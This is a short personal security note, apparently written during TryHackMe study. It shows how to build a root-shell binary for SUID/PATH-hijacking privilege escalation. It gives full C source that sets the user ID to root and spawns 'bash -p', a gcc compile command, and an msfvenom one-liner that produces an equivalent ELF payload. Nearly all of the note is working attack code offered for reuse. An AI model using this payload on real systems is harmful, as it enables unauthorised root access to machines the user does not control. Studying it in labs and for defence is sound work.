# How to Load a Shell with a Simple Executable

It’s actually trivial to write a C program that loads up a shell.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void main() {
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile with:

```bash
gcc -fPIC -o /path/to/malicious /path/to/malicious.c
```

Note that this is *almost* identical to the [LD_PRELOAD trick](exploiting-ld-preload.md); the differences are:

* Use `main()` instead of `_init()` as our entry point.
* Compile without -shared and -nostartfiles.

A simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.

## Metasploit

The [msfvenom](metasploit.md) tool  can generate binaries with essentially the same functionality as above.

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
```

## References

* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)

- - - -

👤 Nathan Acks  
📅 November 2, 2021
